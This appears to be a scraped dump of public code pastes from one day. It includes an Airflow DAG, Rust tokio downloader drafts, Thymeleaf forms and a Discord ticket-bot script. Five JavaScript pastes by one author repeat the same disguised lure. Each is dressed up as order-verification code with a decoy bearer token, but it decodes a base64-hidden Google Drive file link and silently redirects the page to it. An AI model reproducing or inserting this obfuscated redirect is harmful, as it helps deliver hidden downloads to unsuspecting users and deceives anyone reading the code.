+
+from venv import create
+import pendulum
+from airflow import DAG
+from airflow.operators.python import PythonOperator
+from plugins.steps.churn import create_table, extract, transform, load
+from plugins.steps.messages import send_telegram_success_message, send_telegram_failure_message
+
+with DAG(
+    dag_id='alt_churn',
+    schedule='@once',
+    start_date=pendulum.datetime(2023, 1, 1, tz=""UTC""),
+    tags=[""ETL""],
+    on_success_callback=send_telegram_success_message,
+    on_failure_callback=send_telegram_failure_message
+) as dag:
+    
+    # код даг
+    create_table_step = PythonOperator(task_id='create_table', python_callable=create_table)
+    extract_step = PythonOperator(task_id='extract', python_callable=extract)
+    transform_step = PythonOperator(task_id='transform', python_callable=transform)
+    load_step = PythonOperator(task_id='load', python_callable=load)
+
+    create_table_step >> extract_step >> transform_step >> load_step"
+01EQP0Lq,Products.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 09:32:01 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/67157/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+FfNLfUJA,Order.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 09:16:35 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/13731/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+jRqpkz3D,Market.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 09:00:51 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/91782/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+ynzZBV0k,Tokio Rust Concurrency Attempt 4,MetonymyQT,Rust,Sunday 6th of April 2025 08:52:43 AM CDT,"use anyhow::{Result, anyhow};
+use log::{debug, error, info};
+use signal_hook::consts::{SIGINT, SIGTERM};
+use signal_hook::iterator::Signals;
+use std::ops::Deref;
+use std::sync::Arc;
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::thread;
+use std::time::Duration;
+use tokio::fs::File;
+use tokio::io::AsyncWriteExt;
+use tokio::sync::mpsc;
+use tokio::sync::mpsc::Sender;
+use tokio::sync::oneshot;
+use tokio::task::{JoinError, JoinHandle};
+use tokio::time::{sleep, timeout};
+use tokio_util::task::TaskTracker;
+
+fn setup_graceful_shutdown(cancelled: oneshot::Sender<bool>) -> JoinHandle<()> {
+    tokio::spawn(async move {
+        let signals = Signals::new([SIGINT, SIGTERM]);
+        match signals {
+            Ok(mut signal_info) => {
+                loop {
+                    if signal_info.pending().next().is_some() {
+                        info!(""user request cancellation"");
+                        let _ = cancelled.send(true);
+                        return;
+                    }
+                    sleep(Duration::from_millis(250)).await;
+                }
+            }
+            Err(error) => {
+                error!(""Failed to setup signal handler: {error}"")
+            }
+        }
+    })
+}
+
+async fn download_image(tx: Sender<Result<bytes::Bytes, anyhow::Error>>, url: &str) {
+    info!(""Downloading image for {}"", url);
+    let resp = reqwest::get(url).await;
+    if let Ok(resp) = resp {
+        let image_bytes = resp.bytes().await;
+        match image_bytes {
+            Ok(data) => {
+                tx.send(Ok(data)).await.expect(""failed to send message"");
+            }
+            Err(err) => {
+                let send_result = tx.send(Err(anyhow!(""failed to get image data: {}"", err)))
+                    .await;
+
+                debug!(""download image ok {:?} for url {}"", send_result, url)
+            }
+        }
+    } else {
+        let send_result = tx.send(Err(anyhow!(""failed to get response"")))
+            .await;
+
+        debug!(""download image error {:?}  for url {}"", send_result, url)
+    }
+}
+
+#[tokio::main]
+async fn main() -> Result<()> {
+    env_logger::init();
+
+    let task_timeout = Duration::from_millis(60000);
+
+    let (tx, mut rx) = mpsc::channel(32);
+    let (cancel_tx, mut cancel_rx) = oneshot::channel::<bool>();
+    let tracker = TaskTracker::new();
+    let signal_wait_handle = setup_graceful_shutdown(cancel_tx);
+
+    let urls: Vec<&str> = vec![
+        ""https://images.unsplash.com/photo-1739117956532-8a37c76093dd?fm=jpg"",
+        ""https://images.unsplash.com/photo-1735930371721-d1243e8122ab?fm=jpg"",
+        ""https://images.unsplash.com/photo-1732204662871-f853329ce638?fm=jpg"",
+        ""https://images.unsplash.com/photo-1712677925320-5f93d7f853f5?fm=jpg"",
+        ""https://images.unsplash.com/photo-1712677925900-12574cb3cf15?fm=jpg"",
+        ""https://images.unsplash.com/photo-1710436000845-bb707af976a6?fm=jpg"",
+        ""https://images.unsplash.com/photo-1700386277812-5ff74eb03650?fm=jpg"",
+        ""https://images.unsplash.com/photo-1700386277415-c9c5270ee8b8?fm=jpg"",
+        ""https://images.unsplash.com/photo-1691947563165-28011f40d786?fm=jpg"",
+        ""https://images.unsplash.com/photo-1691782359338-97fcbcce8ce8?fm=jpg"",
+    ];
+
+    let mut handles: Vec<JoinHandle<Result<(), JoinError>>> = Vec::new();
+    for url in urls {
+        let tx = tx.clone();
+        let handle = tracker.spawn(tokio::spawn(async move {
+            let timeout_status = timeout(task_timeout, download_image(tx, url)).await;
+            debug!(""timeout status = {:?} for url {}"", timeout_status, url)
+        }));
+        handles.push(handle);
+    }
+
+    let wait_task = tracker.spawn(tokio::spawn(async move {
+        for handle in handles {
+            let _ = handle.await;
+        }
+        drop(tx);
+    }));
+
+    let write_task = tracker.spawn(tokio::spawn(async move {
+        let mut counter = 1;
+        while let Some(message) = rx.recv().await {
+            if let Ok(image_bytes) = message {
+                let result = timeout(
+                    task_timeout,
+                    tokio::spawn(async move {
+                        let file = File::create(format!(""{}.jpg"", counter)).await;
+                        if let Ok(mut file) = file {
+                            let _ = file.write_all(&image_bytes).await;
+                            info!(""Wrote image {}"", counter);
+                        } else {
+                            error!(""Failed to write image {}"", counter)
+                        }
+                    }),
+                )
+                .await;
+
+                debug!(""write task timeout result {:?}"", task_timeout);
+                counter += 1;
+            }
+        }
+    }));
+
+    tracker.close();
+    tokio::select! {
+        _ = cancel_rx => {
+            info!(""computation cancelled"");
+            wait_task.abort();
+            write_task.abort();
+        }
+        _ = tracker.wait() => {
+            info!(""operation completed"");
+        }
+    }
+    signal_wait_handle.abort();
+
+    Ok(())
+}
+"
+1bkiTbRA,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 08:45:28 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/38512/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+WcDtsDxK,Tokio Rust Concurrency Attempt 3,MetonymyQT,Rust,Sunday 6th of April 2025 08:39:45 AM CDT,"use anyhow::{Result, anyhow};
+use log::{debug, error, info};
+use signal_hook::consts::{SIGINT, SIGTERM};
+use signal_hook::iterator::Signals;
+use std::ops::Deref;
+use std::sync::Arc;
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::thread;
+use std::time::Duration;
+use tokio::fs::File;
+use tokio::io::AsyncWriteExt;
+use tokio::sync::mpsc;
+use tokio::sync::mpsc::Sender;
+use tokio::sync::oneshot;
+use tokio::task::JoinHandle;
+use tokio::time::{sleep, timeout};
+
+fn setup_graceful_shutdown(cancelled: oneshot::Sender<bool>) -> JoinHandle<()> {
+    tokio::spawn(async move {
+        let signals = Signals::new([SIGINT, SIGTERM]);
+        match signals {
+            Ok(mut signal_info) => {
+                loop {
+                    if signal_info.pending().next().is_some() {
+                        info!(""user request cancellation"");
+                        let _ = cancelled.send(true);
+                        return;
+                    }
+                    sleep(Duration::from_millis(250)).await;
+                }
+            }
+            Err(error) => {
+                error!(""Failed to setup signal handler: {error}"")
+            }
+        }
+    })
+}
+
+async fn download_image(tx: Sender<Result<bytes::Bytes, anyhow::Error>>, url: &str) {
+    info!(""Downloading image for {}"", url);
+    let resp = reqwest::get(url).await;
+    if let Ok(resp) = resp {
+        let image_bytes = resp.bytes().await;
+        match image_bytes {
+            Ok(data) => {
+                tx.send(Ok(data)).await.expect(""failed to send message"");
+            }
+            Err(err) => {
+                let send_result = tx.send(Err(anyhow!(""failed to get image data: {}"", err)))
+                    .await;
+
+                debug!(""download image ok {:?} for url {}"", send_result, url)
+            }
+        }
+    } else {
+        let send_result = tx.send(Err(anyhow!(""failed to get response"")))
+            .await;
+
+        debug!(""download image error {:?}  for url {}"", send_result, url)
+    }
+}
+
+#[tokio::main]
+async fn main() -> Result<()> {
+    env_logger::init();
+
+    let task_timeout = Duration::from_millis(60000);
+
+    let (tx, mut rx) = mpsc::channel(32);
+    let (cancel_tx, mut cancel_rx) = oneshot::channel::<bool>();
+    let (done_tx, mut done_rx) = oneshot::channel::<bool>();
+    let signal_wait_handle = setup_graceful_shutdown(cancel_tx);
+
+    let urls: Vec<&str> = vec![
+        ""https://images.unsplash.com/photo-1739117956532-8a37c76093dd?fm=jpg"",
+        ""https://images.unsplash.com/photo-1735930371721-d1243e8122ab?fm=jpg"",
+        ""https://images.unsplash.com/photo-1732204662871-f853329ce638?fm=jpg"",
+        ""https://images.unsplash.com/photo-1712677925320-5f93d7f853f5?fm=jpg"",
+        ""https://images.unsplash.com/photo-1712677925900-12574cb3cf15?fm=jpg"",
+        ""https://images.unsplash.com/photo-1710436000845-bb707af976a6?fm=jpg"",
+        ""https://images.unsplash.com/photo-1700386277812-5ff74eb03650?fm=jpg"",
+        ""https://images.unsplash.com/photo-1700386277415-c9c5270ee8b8?fm=jpg"",
+        ""https://images.unsplash.com/photo-1691947563165-28011f40d786?fm=jpg"",
+        ""https://images.unsplash.com/photo-1691782359338-97fcbcce8ce8?fm=jpg"",
+    ];
+
+    let mut handles: Vec<JoinHandle<()>> = Vec::new();
+    for url in urls {
+        let tx = tx.clone();
+        let handle = tokio::spawn(async move {
+            let timeout_status = timeout(task_timeout, download_image(tx, url)).await;
+            debug!(""timeout status = {:?} for url {}"", timeout_status, url)
+        });
+        handles.push(handle);
+    }
+
+    let wait_task = tokio::spawn(async move {
+        for handle in handles {
+            let _ = handle.await;
+        }
+        drop(tx);
+    });
+
+    let write_task = tokio::spawn(async move {
+        let mut counter = 1;
+        while let Some(message) = rx.recv().await {
+            if let Ok(image_bytes) = message {
+                let result = timeout(
+                    task_timeout,
+                    tokio::spawn(async move {
+                        let file = File::create(format!(""{}.jpg"", counter)).await;
+                        if let Ok(mut file) = file {
+                            let _ = file.write_all(&image_bytes).await;
+                            info!(""Wrote image {}"", counter);
+                        } else {
+                            error!(""Failed to write image {}"", counter)
+                        }
+                    }),
+                )
+                .await;
+
+                debug!(""write task timeout result {:?}"", task_timeout);
+                counter += 1;
+            }
+        }
+        let _ = done_tx.send(true);
+    });
+
+    tokio::select! {
+        _ = cancel_rx => {
+            info!(""computation cancelled"");
+            wait_task.abort();
+            write_task.abort();
+        }
+        _ = done_rx => {
+            info!(""operation completed"");
+        }
+    }
+    signal_wait_handle.abort();
+
+    Ok(())
+}
+"
+b8NYmGZA,Products.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 08:30:05 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/76227/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+JLph5FVv,Tokio Rust Concurrency Attempt 2,MetonymyQT,Rust,Sunday 6th of April 2025 08:22:40 AM CDT,"use anyhow::{Result, anyhow};
+use log::{debug, error, info};
+use signal_hook::consts::{SIGINT, SIGTERM};
+use signal_hook::iterator::Signals;
+use std::ops::Deref;
+use std::sync::Arc;
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::thread;
+use std::time::Duration;
+use tokio::fs::File;
+use tokio::io::AsyncWriteExt;
+use tokio::sync::mpsc;
+use tokio::sync::mpsc::Sender;
+use tokio::sync::oneshot;
+use tokio::task::JoinHandle;
+use tokio::time::{sleep, timeout};
+
+fn setup_graceful_shutdown(cancelled: oneshot::Sender<bool>)  {
+    thread::spawn(move || {
+        let signals = Signals::new([SIGINT, SIGTERM]);
+        match signals {
+            Ok(mut signal_info) => {
+                if signal_info.forever().next().is_some() {
+                    info!(""user request cancellation"");
+                    let _ = cancelled.send(true);
+                    return;
+                }
+            }
+            Err(error) => {
+                error!(""Failed to setup signal handler: {error}"")
+            }
+        }
+    });
+}
+
+async fn download_image(tx: Sender<Result<bytes::Bytes, anyhow::Error>>, url: &str) {
+    info!(""Downloading image for {}"", url);
+    let resp = reqwest::get(url).await;
+    if let Ok(resp) = resp {
+        let image_bytes = resp.bytes().await;
+        match image_bytes {
+            Ok(data) => {
+                tx.send(Ok(data)).await.expect(""failed to send message"");
+            }
+            Err(err) => {
+                let send_result = tx.send(Err(anyhow!(""failed to get image data: {}"", err)))
+                    .await;
+
+                debug!(""download image ok {:?} for url {}"", send_result, url)
+            }
+        }
+    } else {
+        let send_result = tx.send(Err(anyhow!(""failed to get response"")))
+            .await;
+
+        debug!(""download image error {:?}  for url {}"", send_result, url)
+    }
+}
+
+#[tokio::main]
+async fn main() -> Result<()> {
+    env_logger::init();
+
+    let task_timeout = Duration::from_millis(500);
+
+    let (tx, mut rx) = mpsc::channel(32);
+    let (cancel_tx, mut cancel_rx) = oneshot::channel::<bool>();
+    let (done_tx, mut done_rx) = oneshot::channel::<bool>();
+    setup_graceful_shutdown(cancel_tx);
+
+    let urls: Vec<&str> = vec![
+        ""https://images.unsplash.com/photo-1739117956532-8a37c76093dd?fm=jpg"",
+        ""https://images.unsplash.com/photo-1735930371721-d1243e8122ab?fm=jpg"",
+        ""https://images.unsplash.com/photo-1732204662871-f853329ce638?fm=jpg"",
+        ""https://images.unsplash.com/photo-1712677925320-5f93d7f853f5?fm=jpg"",
+        ""https://images.unsplash.com/photo-1712677925900-12574cb3cf15?fm=jpg"",
+        ""https://images.unsplash.com/photo-1710436000845-bb707af976a6?fm=jpg"",
+        ""https://images.unsplash.com/photo-1700386277812-5ff74eb03650?fm=jpg"",
+        ""https://images.unsplash.com/photo-1700386277415-c9c5270ee8b8?fm=jpg"",
+        ""https://images.unsplash.com/photo-1691947563165-28011f40d786?fm=jpg"",
+        ""https://images.unsplash.com/photo-1691782359338-97fcbcce8ce8?fm=jpg"",
+    ];
+
+    let mut handles: Vec<JoinHandle<()>> = Vec::new();
+    for url in urls {
+        let tx = tx.clone();
+        let handle = tokio::spawn(async move {
+            let timeout_status = timeout(task_timeout, download_image(tx, url)).await;
+            debug!(""timeout status = {:?} for url {}"", timeout_status, url)
+        });
+        handles.push(handle);
+    }
+
+    let wait_task = tokio::spawn(async move {
+        for handle in handles {
+            let _ = handle.await;
+        }
+        drop(tx);
+        let _ = done_tx.send(true);
+    });
+
+    let write_task = tokio::spawn(async move {
+        let mut counter = 1;
+        while let Some(message) = rx.recv().await {
+            if let Ok(image_bytes) = message {
+
+                let result = timeout(
+                    task_timeout,
+                    tokio::spawn(async move {
+                        let file = File::create(format!(""{}.jpg"", counter)).await;
+                        if let Ok(mut file) = file {
+                            let _ = file.write_all(&image_bytes).await;
+                            info!(""Wrote image {}"", counter);
+                        } else {
+                            error!(""Failed to write image {}"", counter)
+                        }
+                    }),
+                )
+                .await;
+
+                debug!(""write task timeout result {:?}"", task_timeout);
+
+                counter += 1;
+            }
+        }
+    });
+
+    tokio::select! {
+        _ = cancel_rx => {
+            info!(""computation cancelled"");
+            wait_task.abort();
+            write_task.abort();
+        }
+        _ = done_rx => {
+            info!(""operation completed"");
+        }
+    }
+
+    Ok(())
+}
+"
+3eyBvn0h,form-subject,Namaru,HTML 5,Sunday 6th of April 2025 08:21:02 AM CDT,"<!DOCTYPE html>
+<html xmlns:th=""http://www.thymeleaf.org"">
+<head>
+    <meta charset=""UTF-8"">
+    <title>Formulario de Materia</title>
+    <link rel=""stylesheet"" href=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"">
+</head>
+<body class=""container mt-5"">
+    <h2 th:text=""${materia.id != null} ? 'Editar Materia' : 'Nueva Materia'""></h2>
+    
+    <form th:action=""@{/subjectNew}"" th:object=""${materia}"" method=""post"">
+        <input type=""hidden"" th:field=""*{id}"" />
+        
+        <div class=""mb-3"">
+            <label for=""materia"" class=""form-label"">Nombre</label>
+            <input type=""text"" th:field=""*{materia}"" class=""form-control"" required>
+        </div>
+        
+        <div class=""mb-3"">
+            <label for=""descripcion"" class=""form-label"">Código</label>
+            <input type=""text"" th:field=""*{descripcion}"" class=""form-control"" required>
+        </div>
+        
+        <button type=""submit"" class=""btn btn-primary"">Guardar</button>
+        <a href=""/subject"" class=""btn btn-secondary"">Cancelar</a>
+    </form>
+</body>
+</html>"
+rJmEFMJE,$onInteraction,VodaGamarz,PHP,Sunday 6th of April 2025 08:20:29 AM CDT,"$nomention
+$defer
+$onlyBotPerms[embedlinks;managechannels;sendmessages;managemessages;manageroles;$ephemeral **🚫Command Error:**The bot not has all permissions that need to run the command.]
+$async[loop1]
+  $textSplit[$getUserVar[ticket;1144124427668312126;$guildID];.]
+  $var[loop1;2]
+  $try $var[is_bl;$hasRole[$authorID;$splitText[$var[loop1]]]] $endtry
+  $var[code;%{DOL}%if[%{DOL}%var[is_bl\]!=true\]
+  %{DOL}%try %{DOL}%var[is_bl\;%{DOL}%hasRole[%{DOL}%authorID\;%{DOL}%splitText[%{DOL}%var[loop1\]\]\]\] %{DOL}%endtry
+  %{DOL}%var[loop1\;%{DOL}%sum[%{DOL}%var[loop1\]\;1\]\]
+  %{DOL}%endif]
+  $eval[$replaceText[$cropText[$repeatMessage[10;$repeatMessage[10;$repeatMessage[3;0]]];239;];0;$var[code];-1]]
+$endasync
+
+$async[loop2]
+  $textSplit[$getUserVar[ticket;1344668722299928629;$guildID];.]
+  $var[loop2;2]
+  $try $var[is_staff;$hasRole[$authorID;$splitText[$var[loop2]]]] $endtry
+  $var[code2;%{DOL}%if[%{DOL}%var[is_staff\]!=true\]
+  %{DOL}%try %{DOL}%var[is_staff\;%{DOL}%hasRole[%{DOL}%authorID\;%{DOL}%splitText[%{DOL}%var[loop2\]\]\]\] %{DOL}%endtry
+  %{DOL}%var[loop2\;%{DOL}%sum[%{DOL}%var[loop2\]\;1\]\]
+  %{DOL}%endif]
+  $eval[$replaceText[$cropText[$repeatMessage[10;$repeatMessage[10;$repeatMessage[3;0]]];239;];0;$var[code2];-1]]
+$endasync
+$await[loop1]
+$if[$var[is_bl]==true]
+$ephemeral
+$title[🚫 Command Error]
+$description[You cannot use this button because you have ticket blacklist role.]
+$color[ff0000]
+$removeAllComponents
+$stop
+$endif
+$if[$customID==t.tic.close&save.p]
+$textSplit[$getChannelVar[ticket3;$channelID];.]
+$if[$splitText[1]!=true]
+$ephemeral
+$title[🚫 Only Channel(s)]
+$description[The channel isn't a ticket.Use this command in a ticket.]
+$color[ff0000]
+$removeAllComponents
+$stop
+$endif
+$c[here the already close ticket error ]
+$if[$splitText[3]==true]
+$ephemeral
+$title[🚫 Command Error]
+$description[The ticket is already closed.]
+$color[ff0000]
+$removeAllComponents
+$stop
+$endif
+$jsonParse[$getEmbedData[1347937115958280253;$splitText[2];1;description]]
+$if[$or[$authorID==$json[author];$var[is_staff]==true]!=true]
+$title[🚫 Mission Permission]
+$description[You don't have enough permission to use this command.]
+$color[ff0000]
+$removeAllComponents
+$stop
+$endif
+
+$var[id1;$sendEmbedMessage[$channelID;**<@$authorID>**,;Close Ticket Confirmation;https://discord.com/channels/$guildID/$channelID;Are you sure you want to close and save this ticket?;0e86d4;$username[$authorID]#$discriminator[$authorID];$authorAvatar;#$channelName[$channelID];$serverIcon;;;yes;yes]]
+$removeAllComponents
+$addButton[no;t.tic.close&save.p.y.$authorID;Confirm;success;no;✔;$var[id1]]
+$addButton[no;t.tic.close&save.p.n.$authorID;Cancel;danger;no;❌;$var[id1]]
+
+$endif
+
+$if[$customID==t.tic.close&save.r]
+$textSplit[$getChannelVar[ticket3;$channelID];.]
+$if[$splitText[1]!=true]
+$ephemeral
+$title[🚫 Only Channel(s)]
+$description[The channel isn't a ticket.Use this command in a ticket.]
+$color[ff0000]
+$removeAllComponents
+$stop
+$endif
+$c[here the already close ticket error ]
+$if[$splitText[3]==true]
+$ephemeral
+$title[🚫 Command Error]
+$description[The ticket is already closed.]
+$color[ff0000]
+$removeAllComponents
+$stop
+$endif
+$jsonParse[$getEmbedData[1347937115958280253;$splitText[2];1;description]]
+$if[$or[$authorID==$json[author];$var[is_staff]==true]!=true]
+$title[🚫 Mission Permission]
+$description[You don't have enough permission to use this command.]
+$color[ff0000]
+$removeAllComponents
+$stop
+$endif
+$ephemeral
+$var[id1;$sendEmbedMessage[$channelID;**<@$authorID>**,;Close Ticket Confirmation;https://discord.com/channels/$guildID/$channelID;Are you sure you want to close and save this ticket?;0e86d4;$username[$authorID]#$discriminator[$authorID];$authorAvatar;#$channelName[$channelID];$serverIcon;;;yes;yes]]
+$removeAllComponents
+$addButton[no;t.tic.close&save.p.y.$authorID;Confirm;success;no;✔;$var[id1]]
+$addButton[no;t.tic.close&save.p.n.$authorID;Cancel;danger;no;❌;$var[id1]]
+$endif
+
+$if[$customID==t.tic.close&save.s]
+$textSplit[$getChannelVar[ticket3;$channelID];.]
+$if[$splitText[1]!=true]
+$ephemeral
+$title[🚫 Only Channel(s)]
+$description[The channel isn't a ticket.Use this command in a ticket.]
+$color[ff0000]
+$removeAllComponents
+$stop
+$endif
+$c[here the already close ticket error ]
+$if[$splitText[3]==true]
+$ephemeral
+$title[🚫 Command Error]
+$description[The ticket is already closed.]
+$color[ff0000]
+$removeAllComponents
+$stop
+$endif
+$jsonParse[$getEmbedData[1347937115958280253;$splitText[2];1;description]]
+$if[$or[$authorID==$json[author];$var[is_staff]==true]!=true]
+$title[🚫 Mission Permission]
+$description[You don't have enough permission to use this command.]
+$color[ff0000]
+$removeAllComponents
+$stop
+$endif
+$ephemeral
+$var[id1;$sendEmbedMessage[$channelID;**<@$authorID>**,;Close Ticket Confirmation;https://discord.com/channels/$guildID/$channelID;Are you sure you want to close and save this ticket?;0e86d4;$username[$authorID]#$discriminator[$authorID];$authorAvatar;#$channelName[$channelID];$serverIcon;;;yes;yes]]
+$removeAllComponents
+$addButton[no;t.tic.close&save.p.y.$authorID;Confirm;success;no;✔;$var[id1]]
+$addButton[no;t.tic.close&save.p.n.$authorID;Cancel;danger;no;❌;$var[id1]]
+$endif
+
+$if[$checkContains[$customID;t.tic.close&save.p.y]]
+$if[$checkContains[$customID;$authorID]]
+$textSplit[$getChannelVar[ticket3;$channelID];.]
+$if[$splitText[3]==true]
+$ephemeral
+$title[🚫 Command Error]
+$description[The ticket is already closed.]
+$color[ff0000]
+$removeAllComponents
+$stop
+$endif
+$jsonParse[$getEmbedData[1347937115958280253;$splitText[2];1;description]]
+$if[$or[$authorID==$json[author];$var[is_staff]==true]!=true]
+$title[🚫 Mission Permission]
+$description[You don't have enough permission to use this command.]
+$color[ff0000]
+$removeAllComponents
+$stop
+$endif
+$setChannelVar[ticket3;$getChannelVar[ticket3;$channelID].true;$channelID]
+$textSplit[$getUserVar[ticket3;$authorID];.]
+$editSplitText[2;N/A]
+$setUserVar[ticket3;$joinSplitText[.];$authorID]
+$textSplit[$getChannelVar[ticket3;$channelID];.]
+$deleteMessage[$channelID;$messageID]
+$await[3]
+
+$var[id2;$sendEmbedMessage[$channelID;;<a:tick1:1345334657515917373> Successfully Closed & Saved the ticket!;;Successfully closed and saved the ticket.;2ecc71;$username[$authorID]#$discriminator[$authorID];$authorAvatar;#$channelName[$channelID];$serverIcon;;;yes;no]]
+$endasync
+
+$await[3]
+
+$addButton[no;t.tic.open.p;Open;success;no;🔓;$var[id2]]
+$addButton[no;t.tic.delete.p;Delete Ticket;danger;no;🚮;$var[id2]]
+$addButton[yes;t.tic.staff.panel;Staff Panel;primary;no;🛡️;$var[id2]]
+$async[1]
+$textSplit[$getChannelVar[ticket3;$channelID];.]
+$jsonParse[$getEmbedData[1347937115958280253;$splitText[2];1;description]]
+$setUserVar[ticket3;Value;$json[author];$guildID]
+$editChannelPerms[$channelID;$json[author];-readmessages]
+$endasync
+$else
+$ephemeral
+$title[🚫 Author Only]
+$color[ff0000]
+$description[The button not owned by you,run the command yourself.]
+$endif
+$endif"
+zpdF4EQX,list-subject,Namaru,HTML 5,Sunday 6th of April 2025 08:19:13 AM CDT,"<!DOCTYPE html>
+<html xmlns:th=""http://www.thymeleaf.org"">
+<head>
+    <meta charset=""UTF-8"">
+    <title>Lista de Materias</title>
+    <link rel=""stylesheet"" href=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"">
+</head>
+<body class=""container mt-5"">
+    <h2>Materias Registradas</h2>
+
